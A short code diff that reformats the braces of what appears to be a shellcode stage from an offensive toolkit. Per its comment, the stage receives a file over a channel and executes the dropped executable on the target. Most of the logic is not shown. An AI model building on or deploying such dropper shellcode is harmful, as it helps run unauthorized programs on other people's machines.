@@ -5,8 +5,8 @@
 #include "helpers/memory.cc"
 #include "helpers/process.cc"
 
-SHELLCODE_ENTRY {
-
+SHELLCODE_ENTRY
+{
     Channel channel;
     unsigned int file_sz;
     char file_path[256];
@@ -30,5 +30,4 @@ SHELLCODE_ENTRY {
 
     /* Execute the dropped executable. */
     execute(file_path, argv, envp, channel);
-
-} SHELLCODE_END
+}
